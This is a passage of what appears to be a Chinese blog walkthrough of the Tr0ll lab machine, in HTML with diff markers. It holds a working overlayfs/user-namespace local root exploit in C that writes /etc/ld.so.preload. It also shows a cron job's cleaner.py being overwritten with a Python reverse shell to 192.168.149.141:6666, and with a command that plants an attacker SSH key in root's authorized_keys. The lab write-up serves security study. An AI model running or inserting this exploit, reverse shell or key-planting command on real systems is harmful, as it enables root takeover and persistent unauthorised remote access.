mkdir(<span class="string">"/tmp/ns_sploit/work"</span>, <span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">"/tmp/ns_sploit/upper"</span>,<span class="number">0777</span>);</span><br><span class="line">    mkdir(<span class="string">"/tmp/ns_sploit/o"</span>,<span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    fprintf(stderr,<span class="string">"mount #1\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">"overlay"</span>, <span class="string">"/tmp/ns_sploit/o"</span>, <span class="string">"overlayfs"</span>, MS_MGC_VAL, <span class="string">"lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">// workdir= <span class="keyword">and</span> <span class="string">"overlay"</span> <span class="keyword">is</span> needed on newer kernels, also can<span class="string">'t use /proc as lower</span></span><br><span class="line"><span class="string">        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) &#123;</span></span><br><span class="line"><span class="string">            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        file = ".access";</span></span><br><span class="line"><span class="string">        chmod("/tmp/ns_sploit/work/work",0777);</span></span><br><span class="line"><span class="string">    &#125; else file = "ns_last_pid";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir("/tmp/ns_sploit/o");</span></span><br><span class="line"><span class="string">    rename(file,"ld.so.preload");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chdir("/");</span></span><br><span class="line"><span class="string">    umount("/tmp/ns_sploit/o");</span></span><br><span class="line"><span class="string">    fprintf(stderr,"mount #2\n");</span></span><br><span class="line"><span class="string">    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) &#123;</span></span><br><span class="line"><span class="string">        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) &#123;</span></span><br><span class="line"><span class="string">            exit(-1);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        chmod("/tmp/ns_sploit/work/work",0777);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);</span></span><br><span class="line"><span class="string">    umount("/tmp/ns_sploit/o");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int</span></span><br><span class="line"><span class="string">main(int argc, char **argv)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    int status, fd, lib;</span></span><br><span class="line"><span class="string">    pid_t wrapper, init;</span></span><br><span class="line"><span class="string">    int clone_flags = CLONE_NEWNS | SIGCHLD;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,"spawning threads\n");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if((wrapper = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">        if(unshare(CLONE_NEWUSER) != 0)</span></span><br><span class="line"><span class="string">            fprintf(stderr, "failed to create new user namespace\n");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if((init = fork()) == 0) &#123;</span></span><br><span class="line"><span class="string">            pid_t pid =</span></span><br><span class="line"><span class="string">                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);</span></span><br><span class="line"><span class="string">            if(pid &lt; 0) &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, "failed to create new mount namespace\n");</span></span><br><span class="line"><span class="string">                exit(-1);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            waitpid(pid, &amp;status, 0);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        waitpid(init, &amp;status, 0);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    usleep(300000);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    wait(NULL);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,"child threads done\n");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fd = open("/etc/ld.so.preload",O_WRONLY);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(fd == -1) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,"exploit failed\n");</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    fprintf(stderr,"/etc/ld.so.preload created\n");</span></span><br><span class="line"><span class="string">    fprintf(stderr,"creating shared library\n");</span></span><br><span class="line"><span class="string">    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);</span></span><br><span class="line"><span class="string">    write(lib,LIB,strlen(LIB));</span></span><br><span class="line"><span class="string">    close(lib);</span></span><br><span class="line"><span class="string">    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");</span></span><br><span class="line"><span class="string">    if(lib != 0) &#123;</span></span><br><span class="line"><span class="string">        fprintf(stderr,"couldn'</span>t create dynamic library\n<span class="string">");</span></span><br><span class="line"><span class="string">        exit(-1);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    write(fd,"</span>/tmp/ofs-lib.so\n<span class="string">",16);</span></span><br><span class="line"><span class="string">    close(fd);</span></span><br><span class="line"><span class="string">    system("</span>rm -rf /tmp/ns_sploit /tmp/ofs-lib.c<span class="string">");</span></span><br><span class="line"><span class="string">    execl("</span>/bin/s<span class="string">u","</span>s<span class="string">u",NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>./hack 就拿到了 root 权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592189387876-4a3674eb-748b-4851-9bf9-e6c0fd5d38ac.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=445&originWidth=422&size=46209&status=done&style=none&width=319" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h1><p>通过写入 ssh 密钥获得权限</p>
+<p>连上之后发现过一段时间就会断开，系统有个计划任务，查找一下日志<br><code>cat /var/log/cronlog</code></p>
+<p>发现是一个 cleaner.py 的文件，find 查找一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190554083-cc0ae49c-ab19-46f1-a687-aa059d5466eb.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=76&originWidth=259&size=6723&status=done&style=none&width=362" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190602004-9a764319-1fc5-4f79-ad2a-7a36611dd7e8.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=562&size=141755&status=done&style=none&width=396" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>内容如下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190645289-8fcd1fc2-e6e8-4952-bc7c-b41c3ee18c6b.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=348&size=13648&status=done&style=none&width=300" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>把他改一下，改成</p>
+<h2 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.149.141"</span>,<span class="number">6666</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br><span class="line"><span class="comment">#用https://krober.biz/misc/reverse_shell.php生成的</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192457043-fa575715-280d-44fb-b05c-abd2323e7c51.png#align=left&display=inline&height=305&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1222&size=227094&status=done&style=none&width=611" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="覆盖-ssh"><a href="#覆盖-ssh" class="headerlink" title="覆盖 ssh"></a>覆盖 ssh</h2><p>先在 kali 上生成公钥</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192686042-7044623b-c401-4fcd-a00c-eea7b765d5b0.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=661&size=65145&status=done&style=none&width=462" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后查看一下，把这个复制出来</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192732851-20b11e55-8a2b-47c5-9742-98e1793b24be.png#align=left&display=inline&height=90&margin=%5Bobject%20Object%5D&name=image.png&originHeight=130&originWidth=543&size=44789&status=done&style=none&width=377" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后再把那个 cleaner.py 给写为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.system(<span class="string">'mkdir /root/.ssh; chmod 775 .ssh; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGfjWcCnu2Mi8Op+LBy3HoDYYAaiOoNhfA9W0TMO6kjCvYhjBp62xzu7tWAbm9+EPGLzZ6AmDG0znEyEVpHFgk5dWOak4VYkDX50FXbRPshgQZY4c9RfbNA3Th7dSuFo8m7rWNbMkqxC5KBnTjkek7d20uI3CBPIdRFmjg8cD03Q62DMaxbuE0tIF5nUK65ubltt5blRlWsSKBiELerk7q6Ru5qUnOIjfmefwzFfgvH7QeRT7bZyttytVcG7PqlKXL/Sh2oEOTcgYJmOqWuKaDJqXiY5/9XVEMm+nF4Y19ytAgHNquDv5RUgAC1+5gNaG/gCtaYRxoZbRy1JcFzM5EQ0RK37kEO6mTm+AzRzwvEew2h+Byci1/jffI5OuqM6QFLnaUq/Kxb2yWf7l6Bwfq+nI1kM7n8YPdGF2jL06V2Teo+yUewnGCDbcvhNXm4ryi66vYJfXmNz668dAISYI/821+i/eRKQO5Sv8Eje2a4Y136etzIwQYWaHpYuhwSQc= root@yichen" &gt;&gt; /root/.ssh/authorized_keys'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>
+
+<p>要记得把 id_rsa 复制到 /root/.ssh/ 这里</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592193213034-5c073be7-c154-4122-ab36-50219646c2f2.png#align=left&display=inline&height=439&margin=%5Bobject%20Object%5D&name=image.png&originHeight=676&originWidth=691&size=126613&status=done&style=none&width=449" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>还有很多，但都是用那个脚本配合的<br>参考：<a href="https://blog.csdn.net/weixin_44214107/article/details/100742919" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44214107/article/details/100742919</a></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2022-10-03T13:52:43.681Z" itemprop="dateUpdated">2022-10-03 21:52:43</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/06/15/bgxup4/&title=《Tr0ll》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/06/15/bgxup4/&title=《Tr0ll》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/06/15/bgxup4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tr0ll》 — yichen's blog&url=https://yichen115.github.io/2020/06/15/bgxup4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/06/15/bgxup4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2020/06/15/ucozlv/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Extend&amp;Overlapping</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/06/14/cwqnag/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Hackme CTF</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2020/06/15/bgxup4/&title=《Tr0ll》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2020/06/15/bgxup4/&title=《Tr0ll》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2020/06/15/bgxup4/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tr0ll》 — yichen's blog&url=https://yichen115.github.io/2020/06/15/bgxup4/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2020/06/15/bgxup4/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2020/06/15/bgxup4/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
